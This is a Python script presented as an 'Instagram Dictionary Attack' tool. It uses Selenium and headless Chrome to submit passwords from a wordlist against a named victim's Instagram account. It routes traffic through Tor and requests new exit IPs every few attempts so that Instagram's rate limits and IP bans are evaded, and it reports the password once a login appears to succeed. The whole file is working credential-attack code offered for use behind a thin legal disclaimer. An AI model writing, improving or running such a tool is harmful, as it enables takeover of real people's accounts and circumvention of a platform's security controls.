#Importing modules / libraries
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from stem import Signal
from stem.control import Controller
import time
import sys
import os

#Pretty self explanatory
def banner():
    print("""
-----------------------------------------------
|---------------------------------------------|
|        Instagram Dictionary Attack          |
|---------------------------------------------|
| # Author: IVBecy                            |
|                                             |
| # This script uses TOR proxies              |
|                                             |
| # It is the end user's responsibility       |
|  to obey all applicable laws.               |
|                                             |
|---------------------------------------------|
-----------------------------------------------

    """)

#USAGE
def usage():
    print("""\n
    Usage: py insta.py [-u] [-pl]

    -u : The username of the victim
    -pl : The passwordlist to be used
    """)
    sys.exit()

#########  Taking terminal commands  ###########

if sys.argv[1] != "-u":
    usage()

uname = sys.argv[2]


if sys.argv[3] != "-pl":
    usage()

passlist = sys.argv[4]

ips = []

#Detecting OS, for deleting terminal ("clear" for Linux/Mac, "cls" for windows)
if sys.platform == "win32":
    ops = "cls"
else:
    ops = "clear"


#Fucntion for counting all the lines in the text file
def file_length(fname):
        with open(fname) as f:
                for i, l in enumerate(f):
                        pass
        return i + 1


#Function for getting a new IP, through TOR
def renew_tor_ip():
    with Controller.from_port(port = 9051) as controller:
        controller.authenticate()
        controller.signal(Signal.NEWNYM)


###########  Setting up the driver  ###################

#Assigning TOR proxy
PROXY =  "socks5://127.0.0.1:9050"
#Adding the proxy to chrome
options = webdriver.ChromeOptions()
options.add_argument('--proxy-server=%s' % PROXY)
options.add_argument('headless')
options.add_argument('--log-level=3')
#Setting up the chromedriver
chrome_driver = "C:/webdrivers/chromedriver.exe"
driver = webdriver.Chrome(options=options, executable_path=r'C:/webdrivers/chromedriver.exe') # <<<< EDIT this according to your directory


#Making variables for incrementation, in the for loop
a = 0
b = 1
n = 0

##### 1st time start up info  ######
os.system(ops)
banner()
print("Target: {} || Password List: {} || List length: {}".format(uname, passlist, file_length(str(passlist))))
time.sleep(5)
os.system(ops)

# Main Loop
while True:
    n += 1
    #After every 3rd try, change the IP, so instagram cannot ban it.
    if n % 5 == 0:
        driver.delete_all_cookies()
        print("This IP has been used 5 times")
        print("Requesting new IP")
        driver.quit()
        time.sleep(2)
        #Setting up the driver
        PROXY =  "socks5://127.0.0.1:9051"
        renew_tor_ip()
        options.add_argument("headless")
        options.add_argument("'--log-level=3")
        driver = webdriver.Chrome(options=options, executable_path=r'C:/webdrivers/chromedriver.exe') # <<<< EDIT this according to your directory
        os.system(ops)
    f = open(str(passlist),"r")
    passw = f.readlines()[a:b]
    for p in passw:
        p = str(p)
        p = p.replace("[", "")
        p = p.replace("]", "")
        p = p.replace("'", "")
        p = p.replace("\n", "")
        p = p.replace(",", "")
        print("\n")
    f.close()
    a += 1
    b += 1

    #INFO
    os.system(ops)
    print("\n")
    print("Target: {} || Password List: {} || List length: {}".format(uname, passlist, file_length(str(passlist))))
    print("\n")
    print("\n")
    print("Trying: ", p)
    print("Try: ", n)

    #Getting the IP displayed
    driver.get("http://icanhazip.com")
    ips.append(driver.page_source)
    time.sleep(1)
    if ips.count(driver.page_source) > 5:
        print("\n")
        print("This IP was used more than 5 times")
        print("Requesting new one")
        time.sleep(5)
        renew_tor_ip()

##########################  Getting Instagram, and filling in the input fields  ##########################

    #Navigating to Instagram login page
    driver.get('https://www.instagram.com/accounts/login/')
    time.sleep(3)
    #Finding the username and password boxes
    username = driver.find_element_by_name("username")
    password = driver.find_element_by_name("password")

    #Entering username and password
    username.send_keys(str(uname))
    password.send_keys(str(p))
    time.sleep(1)
    #Submitting, the password and the username
    submit = driver.find_element_by_class_name('sqdOP.L3NKy.y3zKF')
    submit.click()
    time.sleep(1)

######################  Login Detection  ####################

    if "not-logged-in" in driver.page_source:
        print("\n")
        print("Wrong Password, no match")
        time.sleep(5)
        if "Suspicious Login Attempt" in driver.page_source:
            print("\n")
            print("Password Found")
            print("The password is:", p)
            sys.exit()

        elif 'There was a problem logging you into Instagram' in driver.page_source:
            for t in range(2):
                submit = driver.find_element_by_class_name('sqdOP.L3NKy.y3zKF')
                submit.click()
                time.sleep(3)
                if "incorrect" in driver.page_source:
                    print("\n")
                    print("Wrong password, no match")
                    print("Trying another password")
                    break
                elif "We couldn't connect" in driver.page_source:
                    a -= 1
                    b -= 1
                    print("\n")
                    print("Instagram has banned this IP")
                    print("Requesting new one")
                    renew_tor_ip()
                    time.sleep(5)

                elif "Suspicious Login Attempt" in driver.page_source:
                    print("\n")
                    print("Password Found")
                    print("The password is:", p)
                    sys.exit()

                elif 'class="no-js logged-in' in driver.page_source:
                    print("\n")
                    print("Password Found")
                    print("The password is:", p)
                    sys.exit()

                elif "The username you entered doesn't belong to an account." in driver.page_source:
                    print("\n")
                    print("WRONG USERNAME")
                    print("Check the username, and run the script again")
                    sys.exit()

                else:
                    continue
            if 'There was a problem logging you into Instagram' in driver.page_source:
                a -= 1
                b -= 1
                renew_tor_ip()

            elif "The username you entered doesn't belong to an account." in driver.page_source:
                print("\n")
                print("WRONG USERNAME")
                print("Check the username, and run the script again")
                sys.exit()

        elif "We couldn't connect" in driver.page_source:
            a -= 1
            b -= 1
            print("\n")
            print("Instagram has banned this IP")
            print("Requesting new one")
            renew_tor_ip()
            time.sleep(5)


    elif "Suspicious Login Attempt" in driver.page_source:
        print("\n")
        print("Password Found")
        print("The password is:", p)
        sys.exit()

    elif "The username you entered doesn't belong to an account." in driver.page_source:
        print("\n")
        print("WRONG USERNAME")
        print("Check the username, and run the script again")
        sys.exit()

    else:
        print("\n")
        print("Password Found")
        print("The password is:", p)
        sys.exit()
